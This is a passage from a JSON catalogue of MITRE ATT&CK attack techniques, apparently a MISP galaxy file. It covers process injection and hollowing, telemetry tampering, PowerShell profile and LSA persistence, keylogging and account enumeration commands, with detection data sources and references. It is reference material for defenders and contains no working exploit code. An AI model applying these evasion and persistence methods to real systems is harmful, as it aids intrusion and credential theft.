        "kill_chain": [
          "mitre-attack:lateral-movement",
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1037",
          "https://capec.mitre.org/data/definitions/564.html",
          "https://technet.microsoft.com/en-us/library/cc758918(v=ws.10).aspx",
          "https://support.apple.com/de-at/HT2420"
        ]
      },
      "uuid": "03259939-0b57-482f-8eb5-87c0e0d54334",
      "value": "Logon Scripts - T1037"
    },
    {
      "description": "Process hollowing occurs when a process is created in a suspended state then its memory is unmapped and replaced with malicious code. Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), execution of the malicious code is masked under a legitimate process and may evade defenses and detection analysis. (Citation: Leitch Hollowing) (Citation: Endgame Process Injection July 2017)",
      "meta": {
        "external_id": "T1093",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "API monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1093",
          "http://www.autosectools.com/process-hollowing.pdf",
          "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process"
        ]
      },
      "uuid": "1c338d0f-a65e-4073-a5c1-c06878849f21",
      "value": "Process Hollowing - T1093"
    },
    {
      "description": "Obfuscation is hiding the day-to-day building and testing of new tools, chat servers, etc. (Citation: LUCKYCAT2012)",
      "meta": {
        "external_id": "T1309",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1309"
        ]
      },
      "related": [
        {
          "dest-uuid": "72c8d526-1247-42d4-919c-6d7a31ca8f39",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "e6ca2820-a564-4b74-b42a-b6bdf052e5b6",
      "value": "Obfuscate infrastructure - T1309"
    },
    {
      "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1086) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. ",
      "meta": {
        "external_id": "CAPEC-571",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Sensor health and status",
          "Process command-line parameters",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1054",
          "https://capec.mitre.org/data/definitions/571.html",
          "https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=Backdoor:Win32/Lamin.A",
          "https://docs.microsoft.com/en-us/windows/desktop/etw/consuming-events",
          "https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63"
        ]
      },
      "uuid": "6a5848a8-6201-4a2c-8a6a-ca5af8c6f3df",
      "value": "Indicator Blocking - T1054"
    },
    {
      "description": "Adversaries may gain persistence and elevate privileges in certain situations by abusing [PowerShell](https://attack.mitre.org/techniques/T1086) profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments. PowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)",
      "meta": {
        "external_id": "T1504",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "File monitoring",
          "PowerShell logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1504",
          "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6",
          "https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/",
          "https://witsendandshady.blogspot.com/2019/06/lab-notes-persistence-and-privilege.html",
          "http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf"
        ]
      },
      "uuid": "723e3a2b-ca0d-4daa-ada8-82ea35d3733a",
      "value": "PowerShell Profile - T1504"
    },
    {
      "description": "Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.\n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.\n\nAdversaries may use virtual machine software protection as a form of software packing to protect their code. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018)",
      "meta": {
        "external_id": "CAPEC-570",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Binary file metadata"
        ],
        "mitre_platforms": [
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1045",
          "https://capec.mitre.org/data/definitions/570.html",
          "http://en.wikipedia.org/wiki/Executable_compression",
          "https://www.welivesecurity.com/wp-content/uploads/2018/01/WP-FinFisher.pdf"
        ]
      },
      "uuid": "6ff403bc-93e3-48be-8687-e102fdba8c88",
      "value": "Software Packing - T1045"
    },
    {
      "description": "An adversary could attempt to spoof a mobile device's biometric authentication mechanism, for example by providing a fake fingerprint as described by SRLabs in  (Citation: SRLabs-Fingerprint).\n\niOS partly mitigates this attack by requiring the device passcode rather than a fingerprint to unlock the device after every device restart and after 48 hours since the device was last unlocked (Citation: Apple-TouchID).\n\nPlatforms: Android, iOS",
      "meta": {
        "external_id": "T1460",
        "refs": [
          "https://attack.mitre.org/techniques/T1460"
        ]
      },
      "related": [
        {
          "dest-uuid": "dfe29258-ce59-421c-9dee-e85cb9fa90cd",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "revoked-by"
        }
      ],
      "uuid": "45dcbc83-4abc-4de1-b643-e528d1e9df09",
      "value": "Biometric Spoofing - T1460"
    },
    {
      "description": "Collected data is staged in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Data Compressed](https://attack.mitre.org/techniques/T1002) or [Data Encrypted](https://attack.mitre.org/techniques/T1022).\n\nInteractive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.",
      "meta": {
        "external_id": "T1074",
        "kill_chain": [
          "mitre-attack:collection"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows",
          "AWS",
          "GCP",
          "Azure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1074"
        ]
      },
      "uuid": "7dd95ff6-712e-4056-9626-312ea4ab4c5e",
      "value": "Data Staged - T1074"
    },
    {
      "description": "Execution guardrails constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. \n\nGuardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.\n\nEnvironmental keying is one type of guardrail that includes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents) Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).\n\nSimilar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use guardrails and environmental keying to help protect their TTPs and evade detection. For example, environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) In general, guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) where a decision can be made not to further engage because the value conditions specified by the adversary are meant to be target specific and not such that they could occur in any environment.",
      "meta": {
        "external_id": "T1480",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1480",
          "https://www.cyberscoop.com/kevin-mandia-fireeye-u-s-malware-nice/",
          "https://www.schneier.com/academic/paperfiles/paper-clueless-agents.pdf",
          "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134940/kaspersky-lab-gauss.pdf",
          "https://www.proofpoint.com/us/threat-insight/post/home-routers-under-attack-malvertising-windows-android-devices",
          "https://pdfs.semanticscholar.org/2721/3d206bc3c1e8c229fb4820b6af09e7f975da.pdf",
          "https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-internet-exploreredge/",
          "https://github.com/Genetic-Malware/Ebowla/blob/master/Eko_2016_Morrow_Pitts_Master.pdf",
          "https://github.com/nccgroup/demiguise/blob/master/examples/virginkey.js"
        ]
      },
      "uuid": "853c4192-4311-43e1-bfbb-b11b14911852",
      "value": "Execution Guardrails - T1480"
    },
    {
      "description": "Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.\n\n### Windows\n\nThere are multiple approaches to injecting code into a live process. Windows implementations include: (Citation: Endgame Process Injection July 2017)\n\n* **Dynamic-link library (DLL) injection** involves writing the path to a malicious DLL inside a process then invoking execution by creating a remote thread.\n* **Portable executable injection** involves writing malicious code directly into the process (without a file on disk) then invoking execution with either additional code or by creating a remote thread. The displacement of the injected code introduces the additional requirement for functionality to remap memory references. Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue. (Citation: Endgame HuntingNMemory June 2017)\n* **Thread execution hijacking** involves injecting malicious code or the path to a DLL into a thread of a process. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1093), the thread must first be suspended.\n* **Asynchronous Procedure Call** (APC) injection involves attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018)  AtomBombing  (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table. (Citation: Microsoft Atom Table)\n* **Thread Local Storage** (TLS) callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. (Citation: FireEye TLS Nov 2017)\n\n### Mac and Linux\n\nImplementations for Linux and OS X/macOS systems include: (Citation: Datawire Code Injection) (Citation: Uninformed Needle)\n\n* **LD_PRELOAD, LD_LIBRARY_PATH** (Linux), **DYLD_INSERT_LIBRARIES** (Mac OS X) environment variables, or the dlfcn application programming interface (API) can be used to dynamically load a library (shared object) in a process which can be used to intercept API calls from the running process. (Citation: Phrack halfdead 1997)\n* **Ptrace system calls** can be used to attach to a running process and modify it in runtime. (Citation: Uninformed Needle)\n* **/proc/[pid]/mem** provides access to the memory of the process and can be used to read/write arbitrary data to it. This technique is very rare due to its complexity. (Citation: Uninformed Needle)\n* **VDSO hijacking** performs runtime injection on ELF binaries by manipulating code stubs mapped in from the linux-vdso.so shared object. (Citation: VDSO hijack 2009)\n\nMalware commonly utilizes process injection to access system resources through which Persistence and other environment modifications can be made. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
      "meta": {
        "external_id": "CAPEC-640",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "Windows Registry",
          "File monitoring",
          "DLL monitoring",
          "Process monitoring",
          "Named Pipes"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1055",
          "https://capec.mitre.org/data/definitions/640.html",
          "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
          "https://www.endgame.com/blog/technical-blog/hunting-memory",
          "https://msdn.microsoft.com/library/windows/desktop/ms681951.aspx",
          "https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/",
          "https://blog.ensilo.com/atombombing-brand-new-code-injection-for-windows",
          "https://msdn.microsoft.com/library/windows/desktop/ms649053.aspx",
          "https://www.fireeye.com/blog/threat-research/2017/11/ursnif-variant-malicious-tls-callback-technique.html",
          "https://www.datawire.io/code-injection-on-linux-and-macos/",
          "http://hick.org/code/skape/papers/needle.txt",
          "http://phrack.org/issues/51/8.html",
          "http://vxer.org/lib/vrn00.html",
          "https://www.gnu.org/software/acct/",
          "https://access.redhat.com/documentation/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing",
          "http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html",
          "https://docs.microsoft.com/sysinternals/downloads/sysmon",
          "https://github.com/mattifestation/PowerSploit"
        ]
      },
      "uuid": "43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
      "value": "Process Injection - T1055"
    },
    {
      "description": "Adversaries can use methods of capturing user input for obtaining credentials for [Valid Accounts](https://attack.mitre.org/techniques/T1078) and information Collection that include keylogging and user input field interception.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, (Citation: Adventures of a Keystroke) but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider. (Citation: Wrightson 2012)\n\nKeylogging is likely to be used to acquire credentials for new access opportunities when [Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.\n\nAdversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service. (Citation: Volexity Virtual Private Keylogging)",
      "meta": {
        "external_id": "CAPEC-568",
        "kill_chain": [
          "mitre-attack:collection",
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "Windows Registry",
          "Kernel drivers",
          "Process monitoring",
          "API monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1056",
          "https://capec.mitre.org/data/definitions/568.html",
          "http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf",
          "http://blog.leetsys.com/2012/01/02/capturing-windows-7-credentials-at-logon-using-custom-credential-provider/",
          "https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/"
        ]
      },
      "uuid": "bb5a00de-e086-4859-a231-fa793f6797e2",
      "value": "Input Capture - T1056"
    },
    {
      "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n### Windows\n\nAn example command that would obtain details on processes is \"tasklist\" using the [Tasklist](https://attack.mitre.org/software/S0057) utility.\n\n### Mac and Linux\n\nIn Mac and Linux, this is accomplished with the <code>ps</code> command.",
      "meta": {
        "external_id": "CAPEC-573",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1057",
          "https://capec.mitre.org/data/definitions/573.html"
        ]
      },
      "uuid": "8f4a33ec-8b1f-4b80-a2f6-642b2e479580",
      "value": "Process Discovery - T1057"
    },
    {
      "description": "Adversaries may attempt to get a listing of local system or domain accounts. \n\n### Windows\n\nExample commands that can acquire this information are <code>net user</code>, <code>net group <groupname></code>, and <code>net localgroup <groupname></code> using the [Net](https://attack.mitre.org/software/S0039) utility or through use of [dsquery](https://attack.mitre.org/software/S0105). If adversaries attempt to identify the primary user, currently logged in user, or set of users that commonly uses a system, [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) may apply.\n\n### Mac\n\nOn Mac, groups can be enumerated through the <code>groups</code> and <code>id</code> commands. In mac specifically, <code>dscl . list /Groups</code> and <code>dscacheutil -q group</code> can also be used to enumerate groups and users.\n\n### Linux\n\nOn Linux, local users can be enumerated through the use of the <code>/etc/passwd</code> file which is world readable. In mac, this same file is only used in single-user mode in addition to the <code>/etc/master.passwd</code> file.\n\nAlso, groups can be enumerated through the <code>groups</code> and <code>id</code> commands.\n\n### Office 365 and Azure AD\n\nWith authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance)\n\nAzure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) \n\nThe <code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)",
      "meta": {
        "external_id": "CAPEC-575",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Azure activity logs",
          "Office 365 account logs",
          "API monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows",
          "Office 365",
          "Azure AD"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1087",
          "https://capec.mitre.org/data/definitions/575.html",
          "https://docs.microsoft.com/en-us/powershell/module/msonline/get-msolrolemember?view=azureadps-1.0",
          "https://github.com/True-Demon/raindance",
          "https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest",
          "https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/",
          "https://docs.microsoft.com/en-us/powershell/module/exchange/email-addresses-and-address-books/get-globaladdresslist",
          "https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/"
        ]
      },
      "uuid": "72b74d71-8169-42aa-92e0-e7b04b9f5a08",
      "value": "Account Discovery - T1087"
    },
    {
      "description": "Adversaries may steal the credentials of a specific user or service account using Credential Access techniques or capture credentials earlier in their reconnaissance process through social engineering for means of gaining Initial Access. \n\nAccounts that an adversary may use can fall into three categories: default, local, and domain accounts. Default accounts are those that are built-into an OS such as Guest or Administrator account on Windows systems or default factory/provider set accounts on other types of systems, software, or devices. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. (Citation: Microsoft Local Accounts Feb 2019) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\n\nCompromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nDefault accounts are also not limited to Guest and Administrator on client machines, they also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or COTS. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed private keys, or stolen private keys, to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021) (Citation: Metasploit SSH Module)\n\nThe overlap of account access, credentials, and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)",
      "meta": {
        "external_id": "CAPEC-560",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation",
          "mitre-attack:initial-access"
        ],
        "mitre_data_sources": [
          "AWS CloudTrail logs",
          "Stackdriver logs",
          "Authentication logs",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows",
          "AWS",
          "GCP",
          "Azure",
          "SaaS",
          "Office 365"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1078",
          "https://capec.mitre.org/data/definitions/560.html",
          "https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts",
          "https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh",
          "https://technet.microsoft.com/en-us/library/dn535501.aspx",
          "https://technet.microsoft.com/en-us/library/dn487457.aspx"
        ]
      },
      "uuid": "b17a1a56-e99c-403c-8948-561df0cffe81",
      "value": "Valid Accounts - T1078"
    },
    {
      "description": "An adversary performs C2 communications using multiple layers of encryption, typically (but not exclusively) tunneling a custom encryption scheme within a protocol encryption scheme such as HTTPS or SMTPS.",
      "meta": {
        "external_id": "T1079",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "Packet capture",
          "Process use of network",
          "Malware reverse engineering",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1079",
          "http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840",
          "https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html",
          "https://www.fidelissecurity.com/sites/default/files/FTA_1018_looking_at_the_sky_for_a_dark_comet.pdf",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "428ca9f8-0e33-442a-be87-f869cb4cf73e",
      "value": "Multilayer Encryption - T1079"
    },
    {
      "description": "Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to subvert password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.\n\n### Exchange Email Account Takeover\n\nThe Add-MailboxPermission PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission) This command can be run, given adequate permissions, to further access granted to certain user accounts. This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can assign more access rights to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)\n\n### Azure AD\n\nIn Azure, an adversary can set a second password for Service Principals, facilitating persistence.(Citation: Blue Cloud of Death)\n\n### AWS\n\nAWS policies allow trust between accounts by simply identifying the account name. It is then up to the trusted account to only allow the correct roles to have access.(Citation: Summit Route Advanced AWS policy auditing)",
      "meta": {
        "external_id": "T1098",
        "kill_chain": [
          "mitre-attack:credential-access",
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "Authentication logs",
          "API monitoring",
          "Windows event logs",
          "Packet capture"
        ],
        "mitre_platforms": [
          "Windows",
          "Office 365",
          "Azure",
          "GCP",
          "Azure AD",
          "AWS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1098",
          "https://docs.microsoft.com/en-us/powershell/module/exchange/mailboxes/add-mailboxpermission?view=exchange-ps",
          "https://www.slideshare.net/DouglasBienstock/shmoocon-2019-becs-and-beyond-investigating-and-defending-office-365",
          "https://speakerdeck.com/tweekfawkes/blue-cloud-of-death-red-teaming-azure-1",
          "https://summitroute.com/blog/2019/04/03/advanced_aws_policy_auditing_confused_deputies_with_aws_services/",
          "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4738",
          "https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM",
          "https://github.com/gentilkiwi/mimikatz/issues/92"
        ]
      },
      "uuid": "a10641f4-87b4-45a3-a906-92a149cb2c27",
      "value": "Account Manipulation - T1098"
    },
    {
      "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in Persistence and Execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API (see examples).\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to establish Persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of Lateral Movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) for RPC communication.",
      "meta": {
        "external_id": "CAPEC-203",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Windows Registry",
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters",
          "Windows event logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1112",
          "https://capec.mitre.org/data/definitions/203.html",
          "https://technet.microsoft.com/en-us/library/cc732643.aspx",
          "https://docs.microsoft.com/sysinternals/downloads/reghide",
          "https://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/",
          "https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353",
          "https://technet.microsoft.com/en-us/library/cc754820.aspx",
          "https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4657",
          "https://docs.microsoft.com/en-us/sysinternals/downloads/regdelnull"
        ]
      },
      "uuid": "57340c81-c025-4189-8fa0-fc7ede51bae4",
      "value": "Modify Registry - T1112"
    },
    {
      "description": "Windows Authentication Package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. (Citation: MSDN Authentication Packages)\n\nAdversaries can use the autostart mechanism provided by LSA Authentication Packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=<target binary></code>. The binary will then be executed by the system when the authentication packages are loaded.",
      "meta": {
        "external_id": "T1131",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "DLL monitoring",
          "Windows Registry",
          "Loaded DLLs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1131",
          "https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx",
